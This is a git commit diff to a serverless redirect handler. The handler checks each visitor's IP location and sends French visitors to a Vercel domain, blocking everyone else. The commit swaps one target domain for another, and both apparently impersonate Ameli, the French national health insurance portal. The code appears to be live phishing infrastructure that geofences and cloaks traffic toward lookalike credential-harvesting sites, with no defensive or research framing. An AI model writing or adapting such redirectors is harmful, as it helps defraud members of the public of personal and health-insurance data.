474abb44c7840e6ea73657962b2f4ba5bfdde015
nimorox1 <42836075+nimorox@users.noreply.github.com>
2025-09-29 02:03:05 +0200

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -28,7 +28,7 @@ export default async function handler(req, res) {
     const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
     const geoData = await geoResponse.json();
     if (geoData.status === 'success' && geoData.countryCode === 'FR') {
-      res.redirect(301, 'https://espace-ameli-assurance-maladie-port.vercel.app/');
+      res.redirect(301, 'https://appmanager-portail-assure-ameli-fr.vercel.app/');
     } else {
       res.status(403).send('Access restricted to France-based IPs only.');
     }
